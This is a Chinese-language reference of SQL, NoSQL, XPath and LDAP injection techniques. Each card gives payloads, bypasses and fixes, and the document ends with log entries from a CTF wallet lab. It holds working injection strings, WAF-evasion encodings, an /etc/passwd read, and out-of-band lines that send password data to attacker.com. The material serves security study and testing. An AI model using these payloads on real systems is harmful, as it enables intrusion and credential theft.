# SQL 注入技术 (SQL Injection Techniques)

> 来源: PortSwigger Academy / OWASP WSTG / HackTricks / PayloadsAllTheThings
> 条目数: 10 | 分类: 注入 (Injection)

---

### [KB-S01-01] UNION-based SQL Injection
- **信号**: 页面回显数据库查询结果；注入 `ORDER BY n` 可探测列数；`UNION SELECT null,null` 无报错时列数匹配
- **原理**: 通过 UNION SELECT 将攻击者构造的查询结果附加到原查询结果集中，直接读取任意表数据
- **最小PoC**: `' UNION SELECT username, password FROM users--`（需先确认列数；靶场: PortSwigger SQLi lab #3）
- **绕过与变体**: `UNION/**/SELECT` 绕过空格过滤；`UNION ALL SELECT` 避免隐式 DISTINCT；十六进制编码字符串绕过引号过滤
- **修复**: 参数化查询 (PreparedStatement) + 最小权限数据库账户 + 禁用详细错误回显
- **参考**: CWE-89 / PortSwigger: SQL injection UNION attacks / OWASP WSTG-INPV-05

### [KB-S01-02] Error-based SQL Injection
- **信号**: 数据库错误消息直接回显在 HTTP 响应中（如 `ORA-01756`、`Unclosed quotation mark`、类型转换错误）
- **原理**: 触发数据库类型转换或函数错误，将数据嵌入错误消息中返回，常见手法: `extractvalue()`、`updatexml()`(MySQL)、`convert()` 类型溢出 (MSSQL)
- **最小PoC**: `' AND extractvalue(1,concat(0x7e,(SELECT database())))--` (MySQL); `' AND 1=CONVERT(int,(SELECT @@version))--` (MSSQL)
- **绕过与变体**: `exp(~(SELECT * FROM (SELECT user())a))` 双查询报错 (double query)；PostgreSQL `CAST` 报错；Oracle `TO_CHAR` 报错
- **修复**: 关闭详细错误回显 (production) + 参数化查询 + 统一错误页面 + WAF 过滤报错函数关键字
- **参考**: CWE-89 / PortSwigger: Error-based SQL injection / HackTricks: Error Based

### [KB-S01-03] Blind Boolean-based SQL Injection
- **信号**: 无数据/错误回显，但同一参数 `' AND 1=1--` 与 `' AND 1=2--` 产生不同的响应（页面内容、状态码、响应长度差异）
- **原理**: 通过 OR/AND 注入布尔条件，观察应用二态响应逐位推断数据 — 如 `AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'`
- **最小PoC**: `' AND (SELECT CASE WHEN (username='admin') THEN 1 ELSE 0 END FROM users LIMIT 1)=1--` — 存在 admin 时页面正常
- **绕过与变体**: `AND (SELECT 1 FROM users WHERE username LIKE 'a%')` 替代等号；`MID()/SUBSTR()` 替代 `SUBSTRING()`；大小写/注释穿插
- **修复**: 参数化查询 + 响应内容归一化（不因查询结果改变页面结构） + 速率限制
- **参考**: CWE-89 / PortSwigger: Blind SQL injection / OWASP WSTG-INPV-05

### [KB-S01-04] Blind Time-based SQL Injection
- **信号**: 无任何响应差异，但 `' AND SLEEP(5)--` 使页面延迟 5 秒；条件时间注入: `' AND IF(1=1,SLEEP(5),0)--` 有延迟 / `IF(1=2,...)` 无延迟
- **原理**: 利用数据库延时函数 (SLEEP/pg_sleep/WAITFOR DELAY/dbms_lock.sleep) 将布尔条件转换为可观测的时间侧信道
- **最小PoC**: `' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a', SLEEP(5), 0)--` (MySQL)
- **绕过与变体**: `BENCHMARK(5000000,MD5(1))` 替代 SLEEP (MySQL)；`pg_sleep(5)` (PostgreSQL)；`WAITFOR DELAY '0:0:5'` (MSSQL)；堆叠查询: `'; WAITFOR DELAY '0:0:5'--`
- **修复**: 参数化查询 + 数据库查询超时上限 + 禁用危险函数 (SLEEP/BENCHMARK) + 输入长度限制
- **参考**: CWE-89 / PortSwigger: Time-based SQL injection / HackTricks: Time Based

### [KB-S01-05] Out-of-Band (OOB) SQL Injection
- **信号**: 完全盲注（无响应差异、无时间延迟、无错误回显），需自建 DNS/HTTP 监听服务接收外连
- **原理**: 利用数据库的网络外连功能（DNS/HTTP/SMB）将查询结果编码后发往攻击者控制的外部服务器
- **最小PoC**: `'; DECLARE @host varchar(1024); SELECT @host=(SELECT TOP 1 password FROM users)+'.attacker.com'; EXEC('master..xp_dirtree "\\'+@host+'\c$"')--` (MSSQL DNS OOB)；`SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\a'))` (MySQL Windows)
- **绕过与变体**: Oracle `UTL_HTTP.REQUEST` HTTP OOB；PostgreSQL `COPY ... TO PROGRAM` + nslookup；MySQL `LOAD_FILE` 需要 `secure_file_priv=''`
- **修复**: 禁用数据库外连能力（`xp_cmdshell` 禁用、`secure_file_priv=NULL`、`UTL_HTTP` revoke）+ 网络出站白名单 + 参数化查询
- **参考**: CWE-89 / PortSwigger: OOB SQL injection / PayloadsAllTheThings: OOB

### [KB-S01-06] Second-order SQL Injection
- **信号**: 用户输入被安全存储（如注册时的用户名）但在后续查询中被不安全拼接；需跨请求追踪数据流
- **原理**: 攻击载荷先存入数据库，在另一个查询上下文（如报表/搜索/个人资料页）中被取出并拼接进 SQL 执行，首次存储时可能通过参数化逃过检测
- **最小PoC**: 注册用户名为 `admin'--` → 登录后修改密码功能执行 `UPDATE users SET password='new' WHERE username='admin'--'` → 篡改 admin 账户
- **绕过与变体**: 存储型 XSS 转 SQLi；触发器内拼接；脱敏处理仅在第一层但拼接在第二层；`' OR '1'='1` 导致全表影响
- **修复**: 所有 SQL 查询（含读取后拼接）统一参数化 + 输入验证与输出编码分离 + 存储过程内强制参数化
- **参考**: CWE-89 / PortSwigger: Second-order SQL injection / OWASP WSTG-INPV-05

### [KB-S01-07] WAF Bypass — Comments & Encoding
- **信号**: 基础 payload 被 WAF 拦截 (403/406)，但等效变形 payload 通过；Burp Intruder / SQLMap tamper 脚本可探测
- **原理**: 利用 SQL 注释 (`/**/`)、内联注释 (`/*!*/`)、字符编码 (URL/Unicode/十六进制)、大小写变形及等价函数替换绕过 WAF 关键字/正则匹配
- **最小PoC**: `' UNION/**/SELECT/**/password/**/FROM/**/users--` (注释填充)；`%27%20UNION%20SELECT` (URL 编码)；`' UniOn SeLeCt 1,2,3--` (大小写)；`' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--` (MySQL 版本注释)
- **绕过与变体**: 双 URL 编码 `%2527`；Unicode 等效 `＇`(全角)；`CHAR(39)` 替代引号；换行 `%0a` 替代空格；`AND 1 LIKE 1` 替代 `AND 1=1`
- **修复**: WAF 规范化后再匹配 + 参数化查询（从根本上消除注入点）+ 语义分析引擎 + SQL 语法树白名单
- **参考**: CWE-89 / HackTricks: WAF Bypass / PayloadsAllTheThings: WAF Bypass

### [KB-S01-08] NoSQL Injection — MongoDB
- **信号**: 传入 JSON 参数被直接拼入 NoSQL 查询；`{"$gt":""}` 注入返回额外数据；`{"$where":"sleep(5000)"}` 触发时间延迟
- **原理**: 后端将用户输入未经验证地传入 MongoDB 操作符（`$gt`/`$ne`/`$regex`/`$where`），利用查询操作符语义绕过认证或提取数据
- **最小PoC**: `{"username":{"$ne":""},"password":{"$ne":""}}` 绕过登录；`{"username":"admin","password":{"$regex":"^a"}}` 逐字符爆破密码
- **绕过与变体**: `{"$where":"this.password.length > 0"}` JavaScript 表达式注入；`{"$func":"sleep"}` 在 NoSQL 接口中注入；数组注入 `{"username":["admin","attacker"]}`
- **修复**: 输入类型强制校验 (`mongo-sanitize`/`express-mongo-sanitize` 剥离 `$` 前缀操作符) + 禁用 `$where` + ORM/ODM 安全查询 API
- **参考**: CWE-943 / OWASP: NoSQL Injection / HackTricks: NoSQL Injection

### [KB-S01-09] XPATH Injection
- **信号**: 用户输入影响 XPath 查询行为；`' or '1'='1` 绕过认证返回所有节点；`' or 1=1] | //user[` 合并新查询路径
- **原理**: XPath 查询字符串拼接攻击者输入，通过注入 XPath 谓词语法操纵节点选择逻辑或绕过访问控制，等价于针对 XML 数据库的 SQL 注入
- **最小PoC**: `' or '1'='1` → 原查询 `//user[name/text()='' or '1'='1' and password/text()='']` 恒为真，返回所有 `<user>` 节点
- **绕过与变体**: `'] | //secret[true()] | //foo[bar='` (路径注入)；`' and string-length(//user[1]/password/text())>0 and '1'='1` (盲 XPath)；`' and doc('file:///etc/passwd') and '1'='1` (XPath 函数注入)
- **修复**: 参数化 XPath（预编译 `XPathExpression` + 变量绑定）+ 禁用危险函数 (`doc()`/`doc-available()`) + 输入白名单校验
- **参考**: CWE-643 / OWASP: XPATH Injection / PayloadsAllTheThings: XPATH Injection

### [KB-S01-10] LDAP Injection
- **信号**: 登录表单传入 LDAP 查询参数；`*)(uid=*` 绕过认证；`*)(|(uid=*` 返回多条目时应用行为异常
- **原理**: 拼接用户输入构造 LDAP 过滤器，攻击者通过注入 LDAP 过滤器元字符 (`*`, `()`, `|`, `&`) 修改过滤器逻辑，绕过认证或提取目录信息
- **最小PoC**: 认证过滤器 `(&(uid=INPUT)(password=PASS))` → 输入 `*)(uid=*))(|(uid=*` 使过滤器变为 `(&(uid=*)(uid=*))(|(uid=*)(password=...))` — 恒为真绕过登录
- **绕过与变体**: `admin*` 前缀通配绕过精确匹配；盲 LDAP 注入: `*)(objectClass=user)(department=a*` 通过返回状态逐字符暴破属性值；AND/OR 注入: `*)(|(uid=admin)(uid=guest)`
- **修复**: LDAP 过滤器转义（RFC 4515: 转义 `*()\&|~=<>#;+\,"` → ESAPI `encodeForLDAP()`）+ 参数化 LDAP API + 限制返回条目数
- **参考**: CWE-90 / OWASP: LDAP Injection / PayloadsAllTheThings: LDAP Injection

---
## 2026-07-20

### [SQLI-01] 万能密码 SQLi (username=' OR '1'='1)
- **信号**: Express (Node.js), Vuetify 3 (Vue.js SPA), Vite 构建
- **原理**: 登录为 admin (id:6, balance:999999.99, role:admin)
- **最小PoC**: 见案例 20260720-digital-wallet-sqli-idor
- **绕过与变体**: 待补充
- **修复**: 待补充
- **来源**: 案例: Digital Wallet Lab (ctf) | 工具: 
### [SQLI-02] Blind SQLi (布尔盲注)
- **信号**: Express (Node.js), Vuetify 3 (Vue.js SPA), Vite 构建
- **原理**: 提取 sqlite_master → 发现隐藏表 flags
- **最小PoC**: 见案例 20260720-digital-wallet-sqli-idor
- **绕过与变体**: 待补充
- **修复**: 待补充
- **来源**: 案例: Digital Wallet Lab (ctf) | 工具: 
### [SQLI-03] Blind SQLi (逐字符提取)
- **信号**: Express (Node.js), Vuetify 3 (Vue.js SPA), Vite 构建
- **原理**: 提取 flags.flag_value
- **最小PoC**: 见案例 20260720-digital-wallet-sqli-idor
- **绕过与变体**: 待补充
- **修复**: 待补充
- **来源**: 案例: Digital Wallet Lab (ctf) | 工具: 
### [SQLI-04] 万能密码 SQLi 认证绕过
- **信号**: POST /api/login 或 /login 端点, Content-Type: application/json 登录, 错误响应包含 '用户名或密码错误'
- **原理**: 在登录表单的 username 字段注入 OR 条件，绕过密码验证。
适用于后端使用字符串拼接构建 SQL 查询的场景。

- **最小PoC**: 见技术卡 auth-bypass-or
- **绕过与变体**: 待补充
- **修复**: 待补充
- **来源**: [{'case': '20260720-digital-wallet-sqli-idor', 'outcome': 'admin 登录成功'}]
### [SQLI-05] 布尔盲注逐字符数据提取
- **信号**: UNION SELECT 失败或返回不正确结果, 不同输入导致登录成功/失败 (布尔差异明显), 无 WAF 拦截
- **原理**: 利用登录成功/失败的布尔差异作为 Oracle，逐字符提取数据库内容。
适用于 UNION 不可用或列数不匹配的场景。

- **最小PoC**: 见技术卡 blind-boolean-extraction
- **绕过与变体**: 待补充
- **修复**: 待补充
- **来源**: [{'case': '20260720-digital-wallet-sqli-idor', 'outcome': '成功提取 flags.flag_value (37 字符)'}]
